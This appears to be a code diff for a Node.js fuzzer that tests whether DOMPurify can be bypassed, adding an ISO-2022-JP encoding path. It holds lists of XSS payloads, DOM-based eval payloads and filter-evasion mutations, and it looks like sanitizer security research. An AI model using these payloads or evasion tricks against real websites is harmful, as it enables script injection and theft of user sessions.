@@ -11,241 +11,250 @@ const fs = require('fs');
 const config = {
   maxPayloads: 1000,
   encodings: ['ISO-2022-JP'],
+  // encodings: [
+  //   'UTF-8', 'UTF-16LE', 'UTF-16BE',
+  //   'ISO-8859-1', 'ISO-8859-2', 'ISO-8859-3', 'ISO-8859-4', 'ISO-8859-5',
+  //   'ISO-8859-6', 'ISO-8859-7', 'ISO-8859-8', 'ISO-8859-9', 'ISO-8859-10',
+  //   'ISO-8859-13', 'ISO-8859-14', 'ISO-8859-15', 'ISO-8859-16',
+  //   'windows-1250', 'windows-1251', 'windows-1252', 'windows-1253', 'windows-1254',
+  //   'windows-1255', 'windows-1256', 'windows-1257', 'windows-1258',
+  //   'KOI8-R', 'KOI8-U', 'ASCII', 'ISO-2022-JP'
+  // ],
   mlPayloadCount: 20,
   maxPayloadLength: 100,
   reportFile: 'xss_fuzzer_report.json',
-  maxWorkersPayloads: 10, // Maximum payloads per worker
-  batchSize: 100 // Number of results to accumulate before sending to main thread
+  maxWorkersPayloads: 10,
+  batchSize: 100
 };
 
 class MarkovChain {
-    constructor() {
-        this.chain = new Map();
-    }
+  constructor() {
+    this.chain = new Map();
+  }
 
-    addSequence(sequence) {
-        for (let i = 0; i < sequence.length - 1; i++) {
-            const current = sequence[i];
-            const next = sequence[i + 1];
-            if (!this.chain.has(current)) {
-                this.chain.set(current, new Map());
-            }
-            const nextMap = this.chain.get(current);
-            nextMap.set(next, (nextMap.get(next) || 0) + 1);
-        }
+  addSequence(sequence) {
+    for (let i = 0; i < sequence.length - 1; i++) {
+      const current = sequence[i];
+      const next = sequence[i + 1];
+      if (!this.chain.has(current)) {
+        this.chain.set(current, new Map());
+      }
+      const nextMap = this.chain.get(current);
+      nextMap.set(next, (nextMap.get(next) || 0) + 1);
     }
+  }
 
-    generate(length) {
-        if (this.chain.size === 0) return '';
-        let current = Array.from(this.chain.keys())[Math.floor(Math.random() * this.chain.size)];
-        let result = current;
-        for (let i = 1; i < length; i++) {
-            if (!this.chain.has(current)) {
-                break;
-            }
-            const nextMap = this.chain.get(current);
-            const nextChars = Array.from(nextMap.keys());
-            const nextWeights = Array.from(nextMap.values());
-            const totalWeight = nextWeights.reduce((sum, weight) => sum + weight, 0);
-            let random = Math.random() * totalWeight;
-            let nextIndex = 0;
-            while (random > 0) {
-                random -= nextWeights[nextIndex];
-                nextIndex++;
-            }
-            nextIndex--;
-            const next = nextChars[nextIndex];
-            result += next;
-            current = next;
-        }
-        return result;
+  generate(length) {
+    if (this.chain.size === 0) return '';
+    let current = Array.from(this.chain.keys())[Math.floor(Math.random() * this.chain.size)];
+    let result = current;
+    for (let i = 1; i < length; i++) {
+      if (!this.chain.has(current)) {
+        break;
+      }
+      const nextMap = this.chain.get(current);
+      const nextChars = Array.from(nextMap.keys());
+      const nextWeights = Array.from(nextMap.values());
+      const totalWeight = nextWeights.reduce((sum, weight) => sum + weight, 0);
+      let random = Math.random() * totalWeight;
+      let nextIndex = 0;
+      while (random > 0) {
+        random -= nextWeights[nextIndex];
+        nextIndex++;
+      }
+      nextIndex--;
+      const next = nextChars[nextIndex];
+      result += next;
+      current = next;
     }
+    return result;
+  }
 }
 
 class PayloadGenerator {
-    constructor() {
-        this.successfulPatterns = new Set();
-        this.memoizedPayloads = new Map();
-        this.browserSpecificPayloads = this.generateBrowserSpecificPayloads();
-        this.markovChain = new MarkovChain();
-        this.uniquePayloads = new Set();
+  constructor() {
+    this.successfulPatterns = new Set();
+    this.memoizedPayloads = new Map();
+    this.browserSpecificPayloads = this.generateBrowserSpecificPayloads();
+    this.markovChain = new MarkovChain();
+    this.uniquePayloads = new Set();
+  }
+
+  generateBasePayloads() {
+    return [
+      '<script>alert("XSS")</script>',
+      '<img src=x onerror=alert(1)>',
+      '<svg><script>alert(1)</script></svg>',
+      '<iframe src="javascript:alert(1)"></iframe>',
+      '<a href="javascript:alert(1)">Click me</a>',
+      '<div onmouseover="alert(1)">Hover me</div>',
+      '<input type="text" onfocus="alert(1)" autofocus>',
+      '<details open ontoggle="alert(1)">',
+      '<audio src=x onerror=alert(1)>',
+      '<video src=x onerror=alert(1)>',
+      '<body onload=alert(1)>',
+      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
+      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
+      '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click',
+      '<table background="javascript:alert(1)"></table>',
+      '"><script>alert(1)</script>',
+      '<!-- <img src=x onerror=alert(1)> -->',
+      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+      '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
+    ];
+  }
+
+  generateBrowserSpecificPayloads() {
+    return {
+      chrome: [
+        '<script>({[]})</script>',
+        '<svg><script>alert&#40;1)</script>',
+        '<svg><script>alert&#x28;1&#x29;</script>'
+      ],
+      firefox: [
+        '<svg xmlns="#"><script>alert(1)</script></svg>',
+        '<svg><style>{font-family:\'<script>alert(1)</script>\';}</style></svg>'
+      ],
+      safari: [
+        '<svg><script>alert&lpar;1&rpar;</script>',
+        '<svg><script>alert&#x28;1&#x29;</script>'
+      ],
+      edge: [
+        '<x onclick=alert(1)>click this!',
+        '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">Click me</text></a></svg>'
+      ]
+    };
+  }
+
+  generateDOMBasedPayloads() {
+    return [
+      '"><script>eval(location.hash.slice(1))</script>',
+      '<img src=x onerror=eval(atob(this.id))>',
+      '<svg><script>eval(location.search.slice(1))</script>',
+      '<iframe src="javascript:eval(name)"></iframe>',
+      '<script>eval(document.cookie)</script>'
+    ];
+  }
+
+  generateMLPayloads(count = config.mlPayloadCount, maxLength = config.maxPayloadLength) {
+    const payloads = [];
+    for (let i = 0; i < count; i++) {
+      let payload = this.markovChain.generate(maxLength);
+      if (!payload.includes('<') || !payload.includes('>')) {
+        payload = `<${payload}>`;
+      }
+      if (this.isUniquePayload(payload)) {
+        payloads.push(payload);
+      }
+    }
+    return payloads;
+  }
+
+  isUniquePayload(payload) {
+    const hash = crypto.createHash('sha256').update(payload).digest('hex');
+    if (this.uniquePayloads.has(hash)) {
+      return false;
+    }
+    this.uniquePayloads.add(hash);
+    return true;
+  }
+
+  *generateDynamicPayloads() {
+    const basePayloads = this.generateBasePayloads();
+    const domBasedPayloads = this.generateDOMBasedPayloads();
+    const browserPayloads = Object.values(this.browserSpecificPayloads).flat();
+    const mlPayloads = this.generateMLPayloads();
+
+    const allPayloads = [...basePayloads, ...domBasedPayloads, ...browserPayloads, ...mlPayloads];
+
+    for (const payload of allPayloads) {
+      if (this.isUniquePayload(payload)) {
+        yield payload;
+      }
     }
 
-    generateBasePayloads() {
-        return [
-            '<script>alert("XSS")</script>',
-            '<img src=x onerror=alert(1)>',
-            '<svg><script>alert(1)</script></svg>',
-            '<iframe src="javascript:alert(1)"></iframe>',
-            '<a href="javascript:alert(1)">Click me</a>',
-            '<div onmouseover="alert(1)">Hover me</div>',
-            '<input type="text" onfocus="alert(1)" autofocus>',
-            '<details open ontoggle="alert(1)">',
-            '<audio src=x onerror=alert(1)>',
-            '<video src=x onerror=alert(1)>',
-            '<body onload=alert(1)>',
-            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
-            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
-            '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click',
-            '<table background="javascript:alert(1)"></table>',
-            '"><script>alert(1)</script>',
-            '<!-- <img src=x onerror=alert(1)> -->',
-            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
-            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
-            '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
-        ];
-    }
-
-    generateBrowserSpecificPayloads() {
-        return {
-            chrome: [
-                '<script>({[]})</script>',
-                '<svg><script>alert&#40;1)</script>',
-                '<svg><script>alert&#x28;1&#x29;</script>'
-            ],
-            firefox: [
-                '<svg xmlns="#"><script>alert(1)</script></svg>',
-                '<svg><style>{font-family:\'<script>alert(1)</script>\';}</style></svg>'
-            ],
-            safari: [
-                '<svg><script>alert&lpar;1&rpar;</script>',
-                '<svg><script>alert&#x28;1&#x29;</script>'
-            ],
-            edge: [
-                '<x onclick=alert(1)>click this!',
-                '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">Click me</text></a></svg>'
-            ]
-        };
-    }
-
-    generateDOMBasedPayloads() {
-        return [
-            '"><script>eval(location.hash.slice(1))</script>',
-            '<img src=x onerror=eval(atob(this.id))>',
-            '<svg><script>eval(location.search.slice(1))</script>',
-            '<iframe src="javascript:eval(name)"></iframe>',
-            '<script>eval(document.cookie)</script>'
-        ];
-    }
-
-    generateMLPayloads(count = config.mlPayloadCount, maxLength = config.maxPayloadLength) {
-        const payloads = [];
-        for (let i = 0; i < count; i++) {
-            let payload = this.markovChain.generate(maxLength);
-            if (!payload.includes('<') || !payload.includes('>')) {
-                payload = `<${payload}>`;
-            }
-            if (this.isUniquePayload(payload)) {
-                payloads.push(payload);
-            }
+    for (const pattern of this.successfulPatterns) {
+      const variants = [
+        pattern.replace('alert(1)', 'alert(2)'),
+        pattern.replace('XSS', 'XSS2'),
+        this.mutateSuccessfulPattern(pattern)
+      ];
+      for (const variant of variants) {
+        if (this.isUniquePayload(variant)) {
+          yield variant;
         }
-        return payloads;
+      }
     }
+  }
 
-    isUniquePayload(payload) {
-        const hash = crypto.createHash('sha256').update(payload).digest('hex');
-        if (this.uniquePayloads.has(hash)) {
-            return false;
-        }
-        this.uniquePayloads.add(hash);
-        return true;
-    }
+  mutateSuccessfulPattern(pattern) {
+    const mutations = [
+      p => p.replace('alert', 'confirm'),
+      p => p.replace('1', 'document.domain'),
+      p => p.replace('>', ' id=x>'),
+      p => p.replace('script', 'scrscriptipt'),
+      p => p.replace('on', 'oonn'),
+      p => p.split('').reverse().join('')
+    ];
+    return mutations[Math.floor(Math.random() * mutations.length)](pattern);
+  }
 
-    *generateDynamicPayloads() {
-        const basePayloads = this.generateBasePayloads();
-        const domBasedPayloads = this.generateDOMBasedPayloads();
-        const browserPayloads = Object.values(this.browserSpecificPayloads).flat();
-        const mlPayloads = this.generateMLPayloads();
-
-        const allPayloads = [...basePayloads, ...domBasedPayloads, ...browserPayloads, ...mlPayloads];
-
-        for (const payload of allPayloads) {
-            if (this.isUniquePayload(payload)) {
-                yield payload;
-            }
-        }
-
-        for (const pattern of this.successfulPatterns) {
-            const variants = [
-                pattern.replace('alert(1)', 'alert(2)'),
-                pattern.replace('XSS', 'XSS2'),
-                this.mutateSuccessfulPattern(pattern)
-            ];
-            for (const variant of variants) {
-                if (this.isUniquePayload(variant)) {
-                    yield variant;
-                }
-            }
-        }
-    }
-
-    mutateSuccessfulPattern(pattern) {
-        const mutations = [
-            p => p.replace('alert', 'confirm'),
-            p => p.replace('1', 'document.domain'),
-            p => p.replace('>', ' id=x>'),
-            p => p.replace('script', 'scrscriptipt'),
-            p => p.replace('on', 'oonn'),
-            p => p.split('').reverse().join('')
-        ];
-        return mutations[Math.floor(Math.random() * mutations.length)](pattern);
-    }
-
-    addSuccessfulPattern(payload) {
-        this.successfulPatterns.add(payload);
-        this.markovChain.addSequence(payload);
-    }
+  addSuccessfulPattern(payload) {
+    this.successfulPatterns.add(payload);
+    this.markovChain.addSequence(payload);
+  }
 }
 
 const mutationFunctions = [
-    p => p.toUpperCase(),
-    p => p.toLowerCase(),
-    p => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''),
-    p => encodeURIComponent(p),
-    p => p.replace(/</g, '&lt;'),
-    p => p.replace(/>/g, '&gt;'),
-    p => p.replace(/"/g, '&quot;'),
-    p => p.replace(/'/g, '&#x27;'),
-    p => p.replace(/&/g, '&amp;'),
-    p => p.replace(/\//g, '&#x2F;'),
-    p => p.includes('<script') ? p.replace('script', 'scr\\ipt') : p,
-    p => p.includes('javascript:') ? p.replace('javascript:', 'java\\script:') : p,
-    p => p.includes('=') ? p.replace('=', '&#x3D;') : p,
-    p => p.includes('=') ? p.replace('=', '=\'') : p,
-    p => p.includes('http') ? p.replace('http', 'ht\\tp') : p,
-    p => p.includes('style') ? p.replace('style', 'st\\yle') : p,
-    p => p.replace(/[aeiou]/g, char => `&#x${char.charCodeAt(0).toString(16)};`),
-    p => p.replace(/\s/g, '/**/')
+  p => p.toUpperCase(),
+  p => p.toLowerCase(),
+  p => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''),
+  p => encodeURIComponent(p),
+  p => p.replace(/</g, '&lt;'),
+  p => p.replace(/>/g, '&gt;'),
+  p => p.replace(/"/g, '&quot;'),
+  p => p.replace(/'/g, '&#x27;'),
+  p => p.replace(/&/g, '&amp;'),
+  p => p.replace(/\//g, '&#x2F;'),
+  p => p.includes('<script') ? p.replace('script', 'scr\\ipt') : p,
+  p => p.includes('javascript:') ? p.replace('javascript:', 'java\\script:') : p,
+  p => p.includes('=') ? p.replace('=', '&#x3D;') : p,
+  p => p.includes('=') ? p.replace('=', '=\'') : p,
+  p => p.includes('http') ? p.replace('http', 'ht\\tp') : p,
+  p => p.includes('style') ? p.replace('style', 'st\\yle') : p,
+  p => p.replace(/[aeiou]/g, char => `&#x${char.charCodeAt(0).toString(16)};`),
+  p => p.replace(/\s/g, '/**/')
 ];
 
 function contextAwareMutate(payload) {
-    return mutationFunctions.map(mutate => mutate(payload));
+  return mutationFunctions.map(mutate => mutate(payload));
 }
 
 const memoizedInsertions = new Map();
 
 function insertEscapeSequence(payload, sequence) {
-    const memoKey = `${payload}|${sequence}`;
-    if (memoizedInsertions.has(memoKey)) {
-        return memoizedInsertions.get(memoKey);
-    }
+  const memoKey = `${payload}|${sequence}`;
+  if (memoizedInsertions.has(memoKey)) {
+    return memoizedInsertions.get(memoKey);
+  }
 
-    const insertionPoints = [
-        { index: 0, variant: sequence + payload },
-        { index: payload.length, variant: payload + sequence },
-        { index: payload.indexOf('>'), variant: payload.replace('>', sequence + '>') },
-        { index: payload.indexOf('"'), variant: payload.replace('"', sequence + '"') },
-        { index: payload.indexOf('='), variant: payload.replace('=', sequence + '=') },
-        { index: payload.indexOf('<'), variant: payload.replace('<', sequence + '<') },
-        { index: payload.indexOf('javascript:'), variant: payload.replace('javascript:', 'javascript:' + sequence) }
-    ];
+  const insertionPoints = [
+    { index: 0, variant: sequence + payload },
+    { index: payload.length, variant: payload + sequence },
+    { index: payload.indexOf('>'), variant: payload.replace('>', sequence + '>') },
+    { index: payload.indexOf('"'), variant: payload.replace('"', sequence + '"') },
+    { index: payload.indexOf('='), variant: payload.replace('=', sequence + '=') },
+    { index: payload.indexOf('<'), variant: payload.replace('<', sequence + '<') },
+    { index: payload.indexOf('javascript:'), variant: payload.replace('javascript:', 'javascript:' + sequence) }
+  ];
 
-    const result = insertionPoints
-        .filter(point => point.index !== -1)
-        .map(point => point.variant);
+  const result = insertionPoints
+    .filter(point => point.index !== -1)
+    .map(point => point.variant);
 
-    memoizedInsertions.set(memoKey, result);
-    return result;
+  memoizedInsertions.set(memoKey, result);
+  return result;
 }
 
 const window = new JSDOM('').window;
@@ -266,6 +275,30 @@ function categorizeBypass(original, cleaned) {
   return 'Unknown';
 }
 
+// Basic ISO-2022-JP encoding function
+function basicISO2022JPEncode(str) {
+  const ascii = Buffer.from('\x1B(B').toString('binary');
+  const jis = Buffer.from('\x1B$B').toString('binary');
+  let result = ascii;
+  for (let i = 0; i < str.length; i++) {
+    const charCode = str.charCodeAt(i);
+    if (charCode > 127) {
+      result += jis + str[i] + ascii;
+    } else {
+      result += str[i];
+    }
+  }
+  return result;
+}
+
+function encodeWithFallback(payload, encoding) {
+  if (encoding === 'ISO-2022-JP') {
+    return basicISO2022JPEncode(payload);
+  } else {
+    return Iconv.encode(Iconv.decode(Buffer.from(payload), 'utf8'), encoding).toString('binary');
+  }
+}
+
 function* fuzzEncodings(payload, escapeSequence) {
   if (!/[<>'"&]/.test(payload)) {
     return;
@@ -273,7 +306,12 @@ function* fuzzEncodings(payload, escapeSequence) {
 
   for (const encoding of config.encodings) {
     try {
-      const encodedPayload = Iconv.encode(Iconv.decode(Buffer.from(payload), 'utf8'), encoding).toString('binary');
+      if (encoding !== 'ISO-2022-JP' && !Iconv.encodingExists(encoding)) {
+        console.warn(`Encoding not supported: ${encoding}`);
+        continue;
+      }
+
+      const encodedPayload = encodeWithFallback(payload, encoding);
       const cleanedPayload = testDOMPurify(encodedPayload);
       
       if (cleanedPayload !== encodedPayload) {
@@ -294,17 +332,17 @@ function* fuzzEncodings(payload, escapeSequence) {
   }
 }
 
-const escapeSequences = Array.from({length: 256}, (_, i) => `\\x${i.toString(16).padStart(2, '0')}`);
+const escapeSequences = Array.from({ length: 256 }, (_, i) => `\\x${i.toString(16).padStart(2, '0')}`);
 
 if (isMainThread) {
   console.log("Starting XSS fuzzer...");
   const payloadGenerator = new PayloadGenerator();
   const numCPUs = Math.min(os.cpus().length, Math.ceil(config.maxPayloads / config.maxWorkersPayloads));
-  
+
   console.log(`Generating payloads... (max: ${config.maxPayloads})`);
   const payloadIterator = payloadGenerator.generateDynamicPayloads();
   const workerPayloads = Array(numCPUs).fill().map(() => []);
-  
+
   let totalPayloads = 0;
   for (let i = 0; i < config.maxPayloads && totalPayloads < numCPUs * config.maxWorkersPayloads; i++) {
     const { value: payload, done } = payloadIterator.next();
@@ -312,7 +350,7 @@ if (isMainThread) {
     workerPayloads[i % numCPUs].push(payload);
     totalPayloads++;
   }
-  
+
   console.log(`Generated ${totalPayloads} unique payloads.`);
   console.log(`Distributing payloads across ${numCPUs} worker threads...`);
 
@@ -382,10 +420,10 @@ if (isMainThread) {
 
 function processResults(results, payloadGenerator) {
   console.log(`Processing ${results.length} total results...`);
-  
+
   console.log("\nFuzzing complete. Summary of results:");
   console.log(`Total potential bypasses found: ${results.length}`);
-  
+
   const byCategory = results.reduce((acc, result) => {
     acc[result.category] = (acc[result.category] || 0) + 1;
     return acc;
